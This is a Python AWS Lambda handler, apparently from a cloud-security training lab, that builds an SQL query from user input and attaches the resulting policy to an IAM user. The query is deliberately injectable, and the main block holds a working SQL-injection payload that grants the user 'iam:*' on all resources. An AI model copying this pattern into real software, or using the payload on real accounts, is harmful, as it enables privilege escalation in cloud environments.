import boto3
import urllib.parse
from sqlite_utils import Database

db = Database("my_database.db")
iam_client = boto3.client('iam')


# db["policies"].insert_all([
#     {"policy_name": "CustomPolicy1", "public": 'True', "policy_document" : """{
#             "Version": "2012-10-17",
#             "Statement": [
#                 {
#                     "Sid": "VisualEditor0",
#                     "Effect": "Allow",
#                     "Action": [
#                         "elasticbeanstalk:DescribePlatformVersion",
#                         "elasticbeanstalk:DescribeAccountAttributes",
#                         "elasticbeanstalk:DescribeEnvironmentManagedActionHistory",
#                         "elasticbeanstalk:ValidateConfigurationSettings",
#                         "elasticbeanstalk:DescribeConfigurationSettings",
#                         "elasticbeanstalk:CheckDNSAvailability",
#                         "elasticbeanstalk:ListTagsForResource",
#                         "elasticbeanstalk:DescribeEnvironmentResources",
#                         "elasticbeanstalk:DescribeEnvironmentManagedActions",
#                         "elasticbeanstalk:RequestEnvironmentInfo",
#                         "elasticbeanstalk:DescribeEvents",
#                         "elasticbeanstalk:DescribeConfigurationOptions",
#                         "elasticbeanstalk:DescribeInstancesHealth",
#                         "elasticbeanstalk:DescribeEnvironmentHealth",
#                         "elasticbeanstalk:RetrieveEnvironmentInfo"
#                     ],
#                     "Resource": "*"
#                 }
#             ]
#         }"""
#     }, 
#     {"policy_name": "CustomPolicy2", "public": 'True', "policy_document" : """{}"""},
#     {"policy_name": "CustomPolicy3", "public": 'True', "policy_document" : """{}"""},
#     {"policy_name": "CustomPolicy4", "public": 'True', "policy_document" : """{}"""},
#     {"policy_name": "CustomPolicy5", "public": 'True', "policy_document" : """{}"""}
# ])


def handler(event, context):
    target_policys = event['policy_names']
    user_name = event['user_name']
    # print(f"target policys are : {target_policys}")

    for policy in target_policys:
        # statement_returns_valid_policy = False
        statement = f"select policy_document from policies where policy_name='{policy}'"
        for split_statement in statement.split(";"):
            for row in db.query(split_statement):
                print(row)
                # statement_returns_valid_policy = True #TODO: does this variable even make any sense?
                # print(f"applying {policy} to {user_name}")
                # response = iam_client.attach_user_policy(
                #     UserName=user_name,
                #     PolicyArn=f"arn:aws:iam::aws:policy/{row['policy_name']}"
                # )
                response = iam_client.put_user_policy(
                    UserName=user_name,
                    PolicyName="random_user_policy",
                    PolicyDocument=row['policy_document']
                )
                # print("result: " + str(response['ResponseMetadata']['HTTPStatusCode']))

        # if not statement_returns_valid_policy: #TODO: this logic needs to be completed for each policy before iterating over them for application
        #     invalid_policy_statement = f"{policy} is not an valid policy"
        #     print(invalid_policy_statement)
        #     return invalid_policy_statement

    # return "All managed policies were applied as expected."


if __name__ == "__main__":
    payload = {
        "policy_names": [
            # "CustomPolicy1",
            """CustomPolicy1\' ;select "{%22Version%22: %222012-10-17%22,%22Statement%22: [{%22Sid%22: %22VisualEditor0%22,%22Effect%22: %22Allow%22,%22Action%22: %22iam:*%22,%22Resource%22: %22*%22}]}" as 'policy_document'-- """
        ],
        "user_name": "cg-bilbo-lambda_injection_privesc_cgid5uk7erya03"
    }
    # print(handler(payload, 'uselessinfo'))
    handler(payload, 'uselessinfo')


